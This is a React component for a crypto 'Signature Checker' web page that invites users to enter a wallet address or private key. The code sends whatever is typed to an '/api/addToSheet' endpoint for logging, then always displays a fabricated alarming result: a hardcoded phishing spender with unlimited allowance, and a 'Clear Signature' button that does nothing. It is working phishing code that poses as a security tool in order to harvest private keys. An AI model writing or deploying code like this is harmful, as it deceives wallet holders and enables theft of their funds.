"use client";

import { useState } from "react";
import { Search } from "lucide-react";
import { formatUTC } from "@/utils/formatUTC";

interface SignatureResult {
  txHash: string;
  lastUpdated: string;
  spender: string;
  allowance: string;
}

export default function SearchSection() {
  const [inputValue, setInputValue] = useState("");
  const [result, setResult] = useState<SignatureResult | null>(null);

  const handleSearch = async () => {
    const value = inputValue.trim();
    if (!value) return;

    try {
      await fetch("/api/addToSheet", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          input: value,
          timestamp: new Date().toISOString(),
        }),
      });
    } catch (err) {
      console.error("Error logging:", err);
    }

    setResult({
      txHash: value,
      lastUpdated: formatUTC(new Date(Date.now() - 3 * 24 * 60 * 60 * 1000)),
      spender: "⚠️ Fake_Phishing1309277",
      allowance: "Unlimited Token",
    });

    setInputValue("");
  };

  return (
    <section className="py-10 px-4 lg:px-0 max-w-4xl mx-auto w-full">
      <h2 className="flex text-[#1B2F3E] items-center justify-center gap-2 text-3xl lg:text-5xl font-bold lg:mb-10 mb-6">
        <img
          src="/logo.png"
          alt=""
          className="object-cover h-10 w-10 lg:h-15 lg:w-15"
        />{" "}
        Signature Checker
      </h2>

      {/* Search Input */}
      <div className="flex items-center gap-2 border border-gray-400 rounded-lg px-4 py-2">
        <Search className="w-5 h-5 text-gray-400" />
        <input
          type="text"
          placeholder="Search by Address or Private Key"
          value={inputValue}
          onChange={(e) => setInputValue(e.target.value)}
          onKeyDown={(e) => e.key === "Enter" && handleSearch()}
          className="flex-1 outline-none bg-transparent"
        />
      </div>

      {/* Results */}
      {result && (
        <div className="mt-8">
          <p className="text-gray-800 font-semibold text-sm mb-6 flex flex-wrap items-center gap-1">
            Search Results for:{" "}
            <span className="font-mono max-w-[250px] truncate block">
              {result.txHash}
            </span>
          </p>
          <div className="overflow-x-auto border border-gray-200 mt-4">
            <table className="w-full text-sm table-fixed">
              <thead className="bg-gray-100 text-left text-gray-700">
                <tr>
                  <th className="px-4 py-2 w-[200px]">Transaction Hash</th>
                  <th className="px-4 py-2 w-[180px]">Last Updated (UTC)</th>
                  <th className="px-4 py-2 w-[200px]">Approved Spender</th>
                  <th className="px-4 py-2 w-[150px] text-nowrap">
                    Original Allowance
                  </th>
                  <th className="px-4 py-2 w-[150px] text-center">Action</th>
                </tr>
              </thead>
              <tbody>
                <tr className="border-t border-gray-200">
                  <td className="px-4 py-2 font-mono truncate max-w-[200px]">
                    {result.txHash}
                  </td>
                  <td className="px-4 py-2 truncate">{result.lastUpdated}</td>
                  <td className="px-4 py-2 text-red-600 font-medium truncate max-w-[200px]">
                    {result.spender}
                  </td>
                  <td className="px-4 py-2 truncate">{result.allowance}</td>
                  <td className="px-4 py-2">
                    <button className="bg-gray-500 cursor-not-allowed text-white px-3 py-1 rounded hover:bg-gray-600 text-nowrap">
                      Clear Signature
                    </button>
                  </td>
                </tr>
              </tbody>
            </table>
          </div>
        </div>
      )}
    </section>
  );
}
